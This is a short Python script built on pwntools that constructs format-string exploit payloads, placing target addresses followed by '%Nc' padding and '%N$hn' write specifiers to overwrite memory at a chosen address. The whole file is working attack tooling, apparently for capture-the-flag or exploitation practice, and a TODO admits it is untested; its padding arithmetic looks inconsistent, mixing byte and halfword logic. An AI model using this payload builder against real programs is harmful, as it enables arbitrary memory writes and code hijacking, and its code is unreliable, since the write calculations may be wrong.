from pwn import *

# TODO untested - modified from %hhn to %hn for less int overflows

'''
Return the padding values in little endian
'''
def get_padding(v: int, w_padding: int):
    byte = list(p32(v))
    padding = list(byte)
    
    # add word padding first
    padding[0] -= w_padding

    if (byte[0] >= 16):
        padding[0] -= 16 # assuming addr addr+1
    else:
        padding[0] = 256 - 16 + padding[0]

    for i in range(1, len(byte)):
        if (byte[i] < byte[i - 1]):
            # do int overflow
            padding[i] = abs(65536 - byte[i - 1]) + byte[i]
            print(padding)
        
        else:
            padding[i] = byte[i] - byte[i - 1]
            print(padding[i])

    return padding

def construct(offset: int, target: int, value: int, w_padding: int):
    
    padding = get_padding(value, w_padding)

    '''
    Construct payload
    '''
    payload = p32(target) + p32(target + 1)

    for i in range(0, 2):
        if (padding[i] != 0):
            payload += f'%{str(padding[i])}c'.encode()
        payload += f'%{offset + i}$hn'.encode()
    
    return payload

